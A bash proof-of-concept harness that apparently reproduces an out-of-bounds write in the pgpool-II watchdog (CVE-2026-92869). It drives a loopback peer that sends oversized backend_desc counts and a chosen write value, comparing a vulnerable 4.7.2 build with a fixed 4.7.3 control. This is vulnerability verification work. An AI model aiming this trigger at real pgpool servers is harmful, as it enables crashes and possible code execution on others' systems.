#!/bin/bash
# CVE-2026-92869 adjacent lane: loopback watchdog peer config JSON replay.
# Never contacts a non-loopback address; kills only PIDs this script started.
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
WORK="${TMPDIR:-/tmp}/w108-pgpool-replay"
VULN="$WORK/pgpool-II-4.7.2/src/pgpool"
FIXED="$WORK/pgpool-II-4.7.3/src/pgpool"
printf '0\n' > "$HERE/pgpool_node_id"
CONF="$HERE/pgpool-w7.conf"

if [ ! -x "$VULN" ] || [ ! -x "$FIXED" ]; then
    echo "build pinned trees first: bash lab/frontier/pgpool2shell/harness/run.sh" >&2
    exit 2
fi
python3 - <<'PY' || exit 2
import socket
for port in (19003, 19004, 19005, 19006):
    s = socket.socket()
    s.settimeout(0.3)
    rc = s.connect_ex(("127.0.0.1", port))
    s.close()
    if rc == 0:
        print(f"port {port} busy; refusing to start", flush=True)
        raise SystemExit(1)
PY

run_case() {
    local bin="$1" tag="$2" n="$3" chosen="${4:-0x42424242}"
    local out="$HERE/evidence-$tag"
    rm -f "$out.stdout" "$out.peer" /tmp/w7-pgpool.log /tmp/w7-pgpool.pid
    python3 "$HERE/peer.py" "$n" "$chosen" 12 >"$out.peer" 2>&1 &
    local peer=$!
    sleep 0.3
    "$bin" -n -D -f "$CONF" >"$out.stdout" 2>&1 &
    local pgpool=$!
    sleep 21
    local recv crash parse
    recv=$(grep -c 'watchdog received' /tmp/w7-pgpool.log 2>/dev/null || true)
    crash=$(grep -c 'terminated by segmentation fault' "$out.stdout" 2>/dev/null || true)
    parse=$(grep -c 'invalid watchdog JSON payload' /tmp/w7-pgpool.log 2>/dev/null || true)
    echo "TAG=$tag N=$n segfault_lines=$crash invalid_json_lines=$parse watchdog_lines=$recv"
    grep -E 'received online recovery request|CONFIG DATA|terminated by segmentation fault|invalid watchdog JSON payload|watchdog is recovering' /tmp/w7-pgpool.log "$out.stdout" 2>/dev/null || true
    kill "$pgpool" 2>/dev/null || true
    sleep 1
    kill -9 "$pgpool" 2>/dev/null || true
    kill "$peer" 2>/dev/null || true
    wait 2>/dev/null || true
    cp /tmp/w7-pgpool.log "$out.daemon" 2>/dev/null || true
}

echo "=== A: pinned 4.7.2, backend_desc N=128 (safe input) ==="
run_case "$VULN" wire-vuln-n128 128
echo "=== B: pinned 4.7.2, backend_desc N=129 (OOB write) ==="
run_case "$VULN" wire-vuln-n129 129
echo "=== C: pinned 4.7.3, backend_desc N=129 (fixed control) ==="
run_case "$FIXED" wire-fixed-n129 129
